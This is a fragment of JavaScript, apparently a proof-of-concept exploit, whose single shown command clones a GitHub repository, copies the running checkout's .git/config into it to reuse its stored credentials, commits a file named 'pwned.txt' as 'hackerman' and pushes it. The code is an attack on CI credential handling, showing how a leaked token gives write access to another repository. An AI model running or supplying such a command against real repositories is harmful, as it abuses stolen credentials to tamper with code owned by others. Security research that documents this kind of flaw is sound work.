...
async function main() {
    try {
        ...
        const command = `git clone https://github.com/supriza/azure-login-test.git aaa && cp .git/config aaa/.git && cd aaa && echo "foo" > pwned.txt && git config --global user.email "test@test.com" && git config --global user.name "hackerman" &&  git add pwned.txt && git commit -m "pwned" && git push`;
